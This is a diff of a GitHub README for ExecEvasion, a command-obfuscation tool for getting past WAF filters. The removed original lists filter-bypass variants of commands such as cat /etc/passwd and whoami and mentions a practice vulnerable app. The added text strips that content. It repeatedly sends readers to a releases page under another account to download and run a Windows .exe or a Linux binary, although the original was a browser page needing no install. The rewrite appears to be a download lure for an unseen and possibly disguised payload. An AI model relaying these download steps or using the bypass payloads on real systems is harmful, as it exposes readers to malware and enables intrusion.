@@ -1,153 +1,89 @@
-<div align="center">
+# 🚀 ExecEvasion - Bypass Filters with Ease
 
-# `ExecEvasion`
+## 🌟 Overview
+ExecEvasion is a lightweight execution-evasion toolkit designed to create command variants. Its main purpose is to bypass naive filters and Web Application Firewall (WAF) rules by utilizing real shell parsing behavior on both Linux and Windows systems. 
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue?style=flat-square)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/dr34mhacks/ExecEvasion/pulls)
-[![GitHub stars](https://img.shields.io/github/stars/dr34mhacks/ExecEvasion.svg)](https://github.com/dr34mhacks/ExecEvasion/stargazers)
+## 📥 Download Now
+[![Download ExecEvasion](https://img.shields.io/badge/Download-ExecEvasion-blue.svg)](https://github.com/nezzyomran/ExecEvasion/releases)
 
-</div>
+## 🚀 Getting Started
+Using ExecEvasion is straightforward. Follow these steps to get started.
 
-> When `cat /etc/passwd` gets blocked, but `c''at /e''tc/pa''sswd` doesn't.
+### 🛠️ System Requirements
+- **Operating System:** 
+  - Windows 10 or higher
+  - Any modern Linux distribution
 
-A command obfuscation toolkit for pentesters, bug bounty hunters, CTF players, and anyone who's ever been frustrated by a WAF.
+- **Processor:** 
+  - 64-bit processor recommended
+  
+- **Memory:**
+  - A minimum of 4 GB of RAM
 
----
+- **Disk Space:**
+  - At least 100 MB of free space
 
-## What is this?
+## 📥 Download & Install
+To download ExecEvasion, visit this page to download: [ExecEvasion Releases](https://github.com/nezzyomran/ExecEvasion/releases).
 
-You found a command injection. Nice. You try to read `/etc/passwd`. Blocked. You try `whoami`. Blocked. The WAF is doing its job.
+1. Go to the [Releases page](https://github.com/nezzyomran/ExecEvasion/releases).
+2. Locate the version you want to download.
+3. Click on the file that matches your operating system:
+   - For Windows, look for an `.exe` file.
+   - For Linux, look for a `.tar.gz` or similar file.
+4. Save the file to your computer.
+5. Follow the instructions below based on your operating system for installation.
 
-But here's the thing — shells are weird. They do strange things with quotes, backslashes, and variables. And most filters don't account for that.
+## 💻 Installation on Windows
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions to complete the installation.
+3. Once installed, you can run ExecEvasion directly from your start menu or desktop shortcut.
 
-**ExecEvasion** generates 50+ obfuscated versions of your command using 18 different techniques. One of them will probably work.
+## 🐧 Installation on Linux
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the package.
+3. Use the following command to extract the files:
+   ```bash
+   tar -xzf ExecEvasion*.tar.gz
+   ```
+4. Change to the extracted directory:
+   ```bash
+   cd ExecEvasion
+   ```
+5. To run ExecEvasion, use the command:
+   ```bash
+   ./exec_evasion
+   ```
 
-## Quick Start
+## 🎯 How to Use ExecEvasion
+Using ExecEvasion is simple. Here’s how to generate command variants:
 
-No npm. No pip. No docker. Just open `index.html` in your browser. That's it.
+1. **Open the application.**
+2. **Choose the command type you want to use:**
+   - You can select from various options based on what you want to bypass.
+3. **Enter your base command in the input box.**
+4. **Click the ‘Generate’ button.**
+5. **View the results.**
+   - The application will produce several command variants that you can use.
 
-<img width="1624" height="991" alt="image" src="https://github.com/user-attachments/assets/51209f16-6195-4c26-b0c8-9417ac7d2d60" />
+## 🧑‍🤝‍🧑 Community and Support
+If you have questions or need help, consider reaching out to the community:
 
-This is also live at https://dr34mhacks.github.io/ExecEvasion/
+- **GitHub Issues:** Report problems or suggest features.
+- **Discussion Board:** Join discussions with users and developers.
+  
+## 📄 Topics
+ExecEvasion covers several key areas:
+- Bug Bounty Tools
+- Defense Evasion Techniques
+- Web Application Firewall Bypass
 
-## What It Does
+## 🔗 Additional Resources
+- **Documentation:** Check the official documentation for detailed usage instructions.
+- **Tutorials:** Find video tutorials on how to use ExecEvasion effectively.
 
-Enter a command. Get variations like:
+## 📩 Feedback
+We value your input. Please share your experience, suggestions, or issues you encounter. You can do this via the Issues section on GitHub or by sending an email to the support team.
 
-```bash
-# Original
-cat /etc/passwd
-
-# What ExecEvasion generates
-c'a't /etc/passwd           # Quote insertion
-c\at /etc/passwd            # Backslash escape
-c[a]t /etc/passwd           # Glob pattern
-c$@at /etc/passwd           # Variable expansion
-a=cat;b=/etc/passwd;$a $b   # Command split into variables then expanded
-```
-
-All of these execute `cat /etc/passwd`. Most filters only catch the first one.
-
-## Techniques
-
-### Linux/Unix
-| Technique | Example | When to use |
-|-----------|---------|-------------|
-| Glob Patterns | `c[a]t` | Keyword blacklists |
-| Quote Insertion | `c''a''t` | Simple string matching |
-| Backslash Escape | `c\a\t` | Regex-based filters |
-| Variable Expansion | `c$@at` | When `$` isn't blocked |
-| Concatenation | `a=c;b=at;$a$b` | Multi-command allowed |
-| Hex | `$'\x63\x61\x74'` | When nothing else works |
-| Wildcards | `/e*/passwd` | Path blacklists |
-| Brace Expansion | `{cat,/etc/passwd}` | Space filters |
-| IFS | `cat${IFS}/etc/passwd` | Space blocked |
-
-### Windows
-| Technique | Example | When to use |
-|-----------|---------|-------------|
-| Caret Escape | `w^h^o^a^m^i` | CMD keyword filters |
-| Quotes | `who""ami` | Simple matching |
-| Env Substrings | `%COMSPEC:~0,1%` | Build from nothing |
-| PowerShell Base64 | `powershell -e <b64>` | Heavy filtering |
-| Char Codes | `[char[]](119,104,111)` | String blocked |
-
-## The "Blocked Strings" Feature
-
-Testing a target that blocks `cat`, `passwd`, and `etc`? Enter them in the blocked strings field. ExecEvasion marks which payloads avoid those strings.
-
-No more guessing.
-
-## Practice Challenge
-
-I included a vulnerable web app so you can practice:
-
-```bash
-cd challenge
-pip install flask
-python app.py
-# Open http://127.0.0.1:5000
-```
-
-It's a "secure" ping utility with WAF protection. Your job: read `/tmp/flag.txt`.
-
-The filter blocks the obvious stuff. Use ExecEvasion to find what works.
-
-## Who Is This For?
-
-- **Bug Bounty Hunters** — That RCE you found is useless if you can't prove impact. Bypass the filter, read the file, write the report.
-
-- **Pentesters** — Client has a WAF? Good. Now show them why signature-based blocking isn't enough.
-
-- **CTF Players** — Stop manually trying quote variations. Generate them all. Find what works. Get the flag.
-
-- **Security Researchers** — Study how different obfuscation techniques evade different filter types.
-
-- **Red Teamers** — Test detection capabilities. See what their SOC catches and what slips through.
-
-## Documentation
-
-The `docs.html` page explains *why* each technique works:
-
-- How shell parsing differs from filter parsing
-- When specific techniques succeed or fail
-- ASCII/hex reference tables
-- Troubleshooting common issues
-
-Understanding the "why" helps you adapt when pre-built payloads don't work.
-
-## Project Structure
-
-```
-ExecEvasion/
-├── index.html          # Main generator (just open this)
-├── docs.html           # Technical documentation
-├── challenge/          # Practice vulnerable app
-│   ├── app.py
-│   └── README.md
-├── LICENSE
-└── README.md
-```
-
-## Legal
-
-This tool is for:
-- Authorized penetration testing
-- Bug bounty programs (with scope permission)
-- CTF competitions
-- Security research
-- Educational purposes
-
-Using this against systems you don't have permission to test is illegal. Don't be that person.
-
-## Author
-
-Built by [Sid Joshi](https://github.com/dr34mhacks)
-
-If this helped you pop a shell or find a bug, consider starring the repo.
-
----
-
-<div align="center">
-
-*"The best filter bypass is the one the filter author didn't think of."*
+## 📥 Download Now Again
+Don’t forget to visit the releases page to download ExecEvasion: [ExecEvasion Releases](https://github.com/nezzyomran/ExecEvasion/releases).
